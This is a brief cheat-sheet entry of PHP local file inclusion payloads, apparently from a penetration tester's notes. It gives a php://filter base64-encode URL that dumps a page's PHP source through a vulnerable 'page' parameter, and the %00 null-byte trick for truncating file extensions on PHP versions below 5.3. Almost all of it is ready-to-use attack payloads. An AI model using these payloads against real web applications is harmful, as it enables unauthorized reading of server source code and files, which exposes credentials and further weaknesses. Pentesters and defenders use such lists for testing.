# php LFI

## include PHP filter base 64 encode
```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=
```

## filename extension nullbyte tecnhique - below php 5.3
%00
